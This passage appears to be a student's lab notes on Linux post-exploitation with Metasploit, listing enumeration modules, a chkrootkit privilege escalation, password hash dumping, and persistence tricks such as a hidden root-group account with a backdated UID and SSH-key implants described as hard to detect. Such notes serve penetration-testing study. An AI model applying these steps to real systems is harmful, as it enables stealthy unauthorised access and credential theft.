...
Modules to use: 
- enum_config // To get all config files on the system
- type `loot` to check where everything is at
- enum_network // enum all the network config, routing table, DNS, Host files etc
- enum_protections // enum all the popular system hardening mechanisms
- type `notes` to see all the notes
- enum_system //enum system info, cronjobs, installed packages
- checkcontainer and checkvm module // check if it's a VM or container
- enum_users_history // As name suggests

**Kernel exploit priv Esc**
- `cat /etc/*issue` // to check the linux version
- `uname -r` // to get kernel version
- `ps aux` // to check process running
- In this lab, there is a chkrootkit script running under the /bin/check-down process and this rootkit is vuln to version 0.5.0 we can cat out this script to see it
- `chkrootkit -V` to check version
- Module for this exploit is `chkrootkit`

**Hashdump**
- linux `gather/hashdump` module and then use `loot` to see the info

**Establishing persistence**
- Important to note that this depends on the differet distros and also target config
- modules to use `chkrootkit`, and `set CHKROOTKIT /bin/chkrootkit`
- Tip: To add an account to blend in, use a service account such as: `useradd -m /var/www/ftp -s /usr/sbin/nologin`
- Add the AC to root group by `usermod -aG root ftp` and to check we say `groups root` or `groups ftp`
- To modify the UID so it doesnt look like it's created recently we can say `usermod -u 15 ftp`
- To see more modules type `search platform:linux persistence`, and try them out.
- A recommandation is the `cron_persistence` and `service_persistence`, which uses cronjobs and services. 
  

**Persistence technique 2 is to add ssh key (recommended)**
- Module is `post/linux/manage/sshkey_persistence`
- how it work is set up a pair or keys, add public key to all the users home dir and provide use a private key which we can access all the accounts
- This technique is very hard to detect becasue the only thing changed is the .ssh folder, no password is changed
